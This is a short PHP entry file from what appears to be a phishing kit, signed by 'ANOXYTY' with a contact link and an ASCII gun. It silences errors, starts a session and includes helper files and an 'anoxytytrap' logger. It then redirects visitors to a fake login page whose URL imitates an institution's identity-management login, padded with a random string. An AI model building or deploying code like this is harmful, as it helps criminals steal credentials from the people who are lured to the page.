<?php 
/*       
// made by ANOXYTY" // https://icq.im/Anoxyty "HQ PAGE"
                           ______
        |\_______________ (_____\\______________
HH======#H###############H#######################
        ' ~""""""""""""""`##(_))#H\"""""Y########
                          ))    \#H\       `"Y###
                          "      }#H)
*/
	
	@error_reporting(0);
@ob_start();
session_start();
	
include 'func.php';
require_once 'anoxytytrap/logger.php';
include 'hidden.php';
	

	$_SESSION['randString'] 	= genRandString(80);
	
	header("Location: login.php?/iamLRR/LrrController?IAM_OP=login&appName=m10707&loginSuccessURL=index={$_SESSION['randString']}");

?>